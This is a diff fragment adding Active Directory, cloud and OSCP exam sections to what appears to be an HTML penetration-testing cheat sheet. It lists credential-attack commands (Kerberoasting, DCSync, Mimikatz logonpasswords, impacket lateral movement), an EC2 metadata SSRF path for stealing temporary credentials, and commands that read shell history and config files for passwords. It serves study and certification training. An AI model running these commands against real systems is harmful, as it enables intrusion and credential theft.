+        <code class="cmd orange">Get-NetUser | select samaccountname</code>
+        <code class="cmd orange">Get-NetGroup "Domain Admins" -FullData</code>
+        <code class="cmd orange">Find-LocalAdminAccess</code>
+      </div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">CrackMapExec — AD</div>
+        <code class="cmd prompt">crackmapexec smb DC_IP -u user -p pass --users</code>
+        <code class="cmd prompt">crackmapexec smb DC_IP -u user -p pass --shares</code>
+        <code class="cmd prompt">crackmapexec smb 192.168.1.0/24 -u user -p pass</code>
+      </div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">LDAP Enumeration</div>
+        <code class="cmd prompt">ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=local" "(objectClass=user)"</code>
+      </div>
+    </div>
+
+    <div class="card" data-cat="exploit" style="border-top-color:#ff66aa;">
+      <div class="card-title" style="color:#ff66aa;border-bottom:1px solid #3d1a2a;padding-bottom:8px;"><span class="icon">⚔️</span> AD Attacks</div>
+      <div class="entry" data-level="advanced">
+        <div class="entry-label">Kerberoasting</div>
+        <code class="cmd prompt">impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request</code>
+        <code class="cmd orange">Invoke-Kerberoast -OutputFormat Hashcat | fl</code>
+        <div class="tip">Crack with: hashcat -m 13100 hashes.txt rockyou.txt</div>
+      </div>
+      <div class="entry" data-level="advanced">
+        <div class="entry-label">AS-REP Roasting</div>
+        <code class="cmd prompt">impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat</code>
+        <div class="tip">Targets accounts with "Do not require Kerberos preauthentication"</div>
+      </div>
+      <div class="entry" data-level="advanced">
+        <div class="entry-label">Pass the Ticket</div>
+        <code class="cmd prompt">impacket-ticketer -nthash HASH -domain-sid SID -domain domain.local Administrator</code>
+        <code class="cmd prompt">export KRB5CCNAME=Administrator.ccache</code>
+        <code class="cmd prompt">impacket-psexec domain.local/Administrator@target -k -no-pass</code>
+      </div>
+      <div class="entry" data-level="advanced">
+        <div class="entry-label">DCSync (Domain Admin required)</div>
+        <code class="cmd prompt">impacket-secretsdump domain.local/admin:pass@DC_IP</code>
+        <code class="cmd orange">Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'</code>
+      </div>
+      <div class="entry" data-level="advanced">
+        <div class="entry-label">Lateral Movement — Impacket</div>
+        <code class="cmd prompt">impacket-psexec domain/user:pass@target</code>
+        <code class="cmd prompt">impacket-wmiexec domain/user:pass@target</code>
+        <code class="cmd prompt">impacket-smbexec domain/user:pass@target</code>
+      </div>
+      <div class="entry" data-level="advanced">
+        <div class="entry-label">Mimikatz (on Windows)</div>
+        <code class="cmd orange">privilege::debug</code>
+        <code class="cmd orange">sekurlsa::logonpasswords</code>
+        <code class="cmd orange">lsadump::sam</code>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         ADVANCED — CLOUD HACKING
+    ══════════════════════════════════════════ -->
+    <div class="phase-banner" id="section-cloud">── Advanced: Cloud Hacking ──</div>
+
+    <div class="card" id="cloud" data-cat="exploit" style="border-top-color:#44ccff;">
+      <div class="card-title" style="color:#44ccff;border-bottom:1px solid #003344;padding-bottom:8px;"><span class="icon">☁️</span> AWS Enumeration</div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">Configure & Identify</div>
+        <code class="cmd prompt">aws configure</code>
+        <code class="cmd prompt">aws sts get-caller-identity</code>
+      </div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">IAM Enumeration</div>
+        <code class="cmd prompt">aws iam get-user</code>
+        <code class="cmd prompt">aws iam list-users</code>
+        <code class="cmd prompt">aws iam list-attached-user-policies --user-name USER</code>
+      </div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">S3 Bucket Enumeration</div>
+        <code class="cmd prompt">aws s3 ls</code>
+        <code class="cmd prompt">aws s3 ls s3://bucket-name --no-sign-request</code>
+        <code class="cmd prompt">aws s3 cp s3://bucket-name/file . --no-sign-request</code>
+      </div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">EC2 Enumeration</div>
+        <code class="cmd prompt">aws ec2 describe-instances</code>
+        <code class="cmd prompt">aws ec2 describe-security-groups</code>
+      </div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">EC2 Metadata SSRF</div>
+        <code class="cmd cyan">http://169.254.169.254/latest/meta-data/</code>
+        <code class="cmd cyan">http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>
+        <div class="tip">Retrieve temp credentials → configure AWS CLI → enumerate as that role</div>
+      </div>
+      <div class="entry" data-level="advanced">
+        <div class="entry-label">Automated — Pacu / ScoutSuite</div>
+        <code class="cmd prompt">pacu   # AWS exploitation framework</code>
+        <code class="cmd prompt">scout suite --provider aws   # multi-cloud auditing</code>
+      </div>
+    </div>
+
+    <div class="card" data-cat="exploit" style="border-top-color:#44ccff;">
+      <div class="card-title" style="color:#44ccff;border-bottom:1px solid #003344;padding-bottom:8px;"><span class="icon">🔷</span> Azure Enumeration</div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">Login & Identity</div>
+        <code class="cmd prompt">az login</code>
+        <code class="cmd prompt">az account show</code>
+        <code class="cmd prompt">az ad signed-in-user show</code>
+      </div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">Users & Groups</div>
+        <code class="cmd prompt">az ad user list --output table</code>
+        <code class="cmd prompt">az ad group list --output table</code>
+        <code class="cmd prompt">az ad group member list --group "Global Administrators"</code>
+      </div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">Resources & VMs</div>
+        <code class="cmd prompt">az resource list --output table</code>
+        <code class="cmd prompt">az vm list --output table</code>
+        <code class="cmd prompt">az storage account list --output table</code>
+      </div>
+      <div class="entry" data-level="advanced">
+        <div class="entry-label">Automated — ROADtools / MicroBurst</div>
+        <code class="cmd prompt">roadrecon gather   # Azure AD recon</code>
+        <code class="cmd orange">Invoke-EnumerateAzureBlobs -Base target   # MicroBurst</code>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         OSCP TIPS
+    ══════════════════════════════════════════ -->
+    <div class="phase-banner" id="section-oscp">── OSCP Tips & Methodology ──</div>
+
+    <div class="card" id="oscp-tips" data-cat="defense">
+      <div class="card-title green"><span class="icon">🎓</span> OSCP Exam Tips</div>
+      <div class="entry">
+        <div class="entry-label">Methodology Order</div>
+        <div class="tip">1. Enumerate everything before exploiting anything</div>
+        <div class="tip">2. Always check for low-hanging fruit: default creds, anonymous login, outdated software</div>
+        <div class="tip">3. If stuck → re-enumerate, check other ports/services</div>
+        <div class="tip">4. Document every step — screenshots + commands</div>
+      </div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">Searchsploit — Find Exploits</div>
+        <code class="cmd prompt">searchsploit apache 2.4</code>
+        <code class="cmd prompt">searchsploit -m 42966   # copy exploit to current dir</code>
+        <code class="cmd prompt">searchsploit --update</code>
+      </div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">Port Knocking</div>
+        <code class="cmd prompt">knock target 1234 5678 9012</code>
+        <code class="cmd prompt">for port in 1234 5678 9012; do nmap -Pn --host-timeout 201 --max-retries 0 -p $port target; done</code>
+      </div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">File Transfer — Python Server</div>
+        <code class="cmd prompt">python3 -m http.server 8080</code>
+        <code class="cmd prompt">python3 -m uploadserver   # supports POST uploads</code>
+      </div>
+      <div class="entry" data-level="advanced">
+        <div class="entry-label">Compile Exploit for Target</div>
+        <code class="cmd prompt">gcc exploit.c -o exploit -m32   # 32-bit</code>
+        <code class="cmd prompt">gcc exploit.c -o exploit        # 64-bit</code>
+        <code class="cmd prompt">cross-compile: i686-linux-gnu-gcc exploit.c -o exploit</code>
+      </div>
+      <div class="entry" data-level="intermediate">
+        <div class="entry-label">Check for Password Reuse</div>
+        <div class="tip">Always try found credentials on all services: SSH, FTP, SMB, RDP, web panels</div>
+      </div>
+    </div>
+
+    <div class="card" data-cat="defense">
+      <div class="card-title green"><span class="icon">📋</span> Quick Wins Checklist</div>
+      <div class="entry">
+        <div class="entry-label">Initial Access Checklist</div>
+        <div class="tip">☐ Anonymous FTP / SMB access</div>
+        <div class="tip">☐ Default credentials on web apps / services</div>
+        <div class="tip">☐ Outdated software (check version → searchsploit)</div>
+        <div class="tip">☐ Exposed .git / .env / backup files</div>
+        <div class="tip">☐ SQLi / LFI on web app parameters</div>
+        <div class="tip">☐ Writable shares with executable files</div>
+      </div>
+      <div class="entry">
+        <div class="entry-label">Post-Shell Checklist</div>
+        <div class="tip">☐ sudo -l (any NOPASSWD entries?)</div>
+        <div class="tip">☐ SUID binaries → GTFOBins</div>
+        <div class="tip">☐ Cron jobs running as root</div>
+        <div class="tip">☐ Writable /etc/passwd or /etc/shadow</div>
+        <div class="tip">☐ World-writable scripts run by root</div>
+        <div class="tip">☐ Credentials in config files / history</div>
+        <code class="cmd prompt">cat ~/.bash_history</code>
+        <code class="cmd prompt">grep -r "password" /etc/ 2>/dev/null</code>
+        <code class="cmd prompt">find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "pass" 2>/dev/null</code>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         DEFENSIVE KNOWLEDGE
+    ══════════════════════════════════════════ -->
     <div class="phase-banner" id="section-defense">── Defensive Knowledge ──</div>
 
     <div class="card" id="defense" data-cat="defense">
@@ -573,17 +826,17 @@
         <div class="tip">• Enable MFA everywhere possible</div>
         <div class="tip">• Use WAF, IDS/IPS, and SIEM</div>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Log Analysis</div>
         <code class="cmd prompt">tail -f /var/log/auth.log</code>
         <code class="cmd prompt">grep "Failed password" /var/log/auth.log</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Check Listening Ports</div>
         <code class="cmd prompt">ss -tulpn</code>
         <code class="cmd prompt">netstat -ano  # Windows</code>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="intermediate">
         <div class="entry-label">Find Persistence</div>
         <code class="cmd prompt">crontab -l && ls /etc/cron*</code>
         <code class="cmd orange">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code>
@@ -621,7 +874,7 @@
         <div class="entry-label">Certifications Path</div>
         <div class="tip">CompTIA Security+ → eJPT → CEH → OSCP → CRTO</div>
       </div>
-      <div class="entry">
+      <div class="entry" data-level="beginner">
         <div class="entry-label">Wordlists</div>
         <code class="cmd prompt">ls /usr/share/wordlists/</code>
         <div class="tip">rockyou.txt, SecLists (GitHub), dirbuster lists</div>
@@ -631,13 +884,15 @@
     <!-- Full-width methodology card -->
     <div class="card" data-cat="defense" style="grid-column:1/-1;">
       <div class="card-title green"><span class="icon">🗺️</span> Pentest Methodology Quick Reference</div>
-      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin-top:8px;">
-        <div><div class="entry-label" style="color:var(--cyan);">① Recon</div><div class="tip">OSINT, DNS, WHOIS, Shodan, Google Dorks, email harvesting</div></div>
-        <div><div class="entry-label" style="color:var(--yellow);">② Scanning</div><div class="tip">Nmap port scans, service detection, OS fingerprinting, vuln scripts</div></div>
-        <div><div class="entry-label" style="color:#aa44ff;">③ Enumeration</div><div class="tip">SMB, LDAP, FTP, HTTP directories, user lists, share lists</div></div>
-        <div><div class="entry-label" style="color:var(--red);">④ Exploitation</div><div class="tip">Metasploit, manual exploits, web vulns, password attacks</div></div>
-        <div><div class="entry-label" style="color:var(--orange);">⑤ Post-Exploit</div><div class="tip">Privesc, persistence, lateral movement, credential dumping, pivoting</div></div>
-        <div><div class="entry-label" style="color:var(--green);">⑥ Report</div><div class="tip">Document findings, severity ratings (CVSS), remediation steps, executive summary</div></div>
+      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px;margin-top:8px;">
+        <div><div class="entry-label" style="color:var(--cyan);">① Recon</div><div class="tip">OSINT, DNS, WHOIS, Shodan, Google Dorks</div></div>
+        <div><div class="entry-label" style="color:var(--yellow);">② Scanning</div><div class="tip">Nmap, service detection, OS fingerprinting</div></div>
+        <div><div class="entry-label" style="color:#aa44ff;">③ Web</div><div class="tip">SQLi, XSS, LFI, SSRF, fuzzing, Burp Suite</div></div>
+        <div><div class="entry-label" style="color:var(--red);">④ Exploitation</div><div class="tip">Metasploit, manual exploits, password attacks</div></div>
+        <div><div class="entry-label" style="color:var(--orange);">⑤ Post-Exploit</div><div class="tip">Privesc, persistence, lateral movement</div></div>
+        <div><div class="entry-label" style="color:#ff66aa;">⑥ AD</div><div class="tip">BloodHound, Kerberoasting, DCSync, Mimikatz</div></div>
+        <div><div class="entry-label" style="color:#44ccff;">⑦ Cloud</div><div class="tip">AWS IAM, S3, metadata SSRF, Azure AD</div></div>
+        <div><div class="entry-label" style="color:var(--green);">⑧ Report</div><div class="tip">CVSS ratings, remediation, executive summary</div></div>
       </div>
     </div>
 
